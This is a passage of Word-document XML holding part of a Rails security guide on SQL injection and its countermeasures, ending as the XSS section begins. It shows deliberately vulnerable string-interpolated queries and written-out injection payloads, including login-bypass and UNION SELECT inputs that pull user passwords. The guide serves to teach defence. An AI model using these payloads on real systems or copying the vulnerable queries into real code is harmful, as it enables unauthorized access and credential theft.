        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> injection attacks aim at influencing database queries by manipulating web application parameters. A popular goal of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> injection attacks is to bypass authorization. Another goal is to carry out data manipulation or reading arbitrary data. Here is an example of how not to use user input data in a query:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5040"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="3B67AC71" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="71789E8E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1223950752"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Project.where("name = '#{params[:name]}'")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="134F3276" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This could be in a search action and the user may enter a project’s name that he wants to find. If a malicious user enters ’ OR 1 —, the resulting </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> query will be:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5205"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="676036C9" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="604F9050" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="424618050"/>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projects WHERE</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>name</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= ''</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>OR</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>1 --'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7122A22C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>The two dashes start a comment ignoring everything after it. So the query returns all records from the projects table including those blind to the user. This is because the condition is true for all records.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58B45410" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>8.2.2 Bypassing Authorization</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1909E12D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Usually a web application includes access control. The user enters his login credentials, the web application tries to find the matching record in the users table. The application grants access when it finds a record. However, an attacker may possibly bypass this check with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> injection. The following shows a typical database query in Rails to find the first record in the users table which matches the login credentials parameters supplied by the user.</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28E96EEB" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2B103C63" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="96415953"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>User.first("login = '#{params[:name]}' AND password = '#{params[:password]}'")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1E50F5C1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If an attacker enters ’ OR ‘1’=‘1 as the name, and ’ OR ’2’&gt;’1 as the password, the resulting </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> query will be: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06F9B3C0" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="22F0B26D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="198668650"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>SELECT</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>* FROM</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>users WHERE</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>login = ''</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>OR</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>'1'='1'</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>AND</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>password</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= ''</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>OR</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>'2'&gt;'1'</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>LIMIT 1</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="34719069" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This will simply find the first record in the database, and grants access to this user.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03BDE6D0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>8.2.3 Unauthorized Reading</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="274C64CC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>UNION</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> statement connects two </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> queries and returns the data in one set. An attacker can use it to read arbitrary data from the database. Let’s take the example from above:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5040"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="478B0BC1" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="38C3B888" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1848207993"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Project.where("name = '#{params[:name]}'")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3C4EB67E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">And now let’s inject another query using the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>UNION</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> statement: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A0B7F8D" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="32BBCF46" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1975060962"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="56293D3B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This will result in the following </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> query:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8278"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="07A9A644" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="071EE7B0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>SELECT</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>* FROM</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>projects WHERE</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(name</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= '') UNION</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="47AB09F4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  SELECT</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>id,login AS</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>name,password</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>AS</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>description,1,1,1 FROM</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>users --'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="125C4344" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>The result won’t be a list of projects (because there is no project with an empty name), but a list of user names and their password. So hopefully you encrypted the passwords in the database! The only problem for the attacker is, that the number of columns has to be the same in both queries. That’s why the second query includes a list of ones (1), which will be always the value 1, in order to match the number of columns in the first query.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="788D42E5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Also, the second query renames some columns with the AS statement so that the web application displays the values from the user table. Be sure to update your Rails </w:t>
      </w:r>
      <w:hyperlink r:id="rId717" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>to at least 2.1.1</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E4C3810" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>8.2.4 Countermeasures</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D0F94CE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Ruby on Rails has a built-in filter for special </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> characters, which will escape ’ , " , </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>NULL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> character and line breaks. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve">Using </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Model.find(id)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Model.find_by_some thing(something)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve"> automatically applies this countermeasure</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. But in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> fragments, especially </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>in conditions fragments (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>where("...")</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve">), the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>connection.execute()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Model.find_by_sql()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve"> methods, it has to be applied manually</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49CC7841" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Instead of passing a string to the conditions option, you can pass an array to sanitize tainted strings like this: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B46C228" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="442E3226" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="645090180"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Model.where("login = ? AND password = ?", entered_user_name, entered_password).first</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="24935705" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">As you can see, the first part of the array is an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> fragment with question marks. The sanitized versions of the variables in the second part of the array replace the question marks. Or you can pass a hash for the same result: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63F01AF" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="437E102A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="283463360"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Model.where(:login</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; entered_user_name, :password</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; entered_password).first</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4A307C07" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The array or hash form is only available in model instances. You can try </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>sanitize_sql()</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> elsewhere. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve">Make it a habit to think about the security consequences when using an external string in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4112F022" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>8.3 Cross-Site Scripting (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>XSS</w:t>
      </w:r>
      <w:r>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E932F28" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">— </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve">The most widespread, and one of the most devastating security vulnerabilities in web applications is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>XSS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>. This malicious attack injects client-side executable code. Rails provides helper methods to fend these attacks off.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F84CD19" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>8.3.1 Entry Points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64BD216E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">An entry point is a vulnerable </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and its parameters where an attacker can start an attack.</w:t>
      </w:r>
    </w:p>
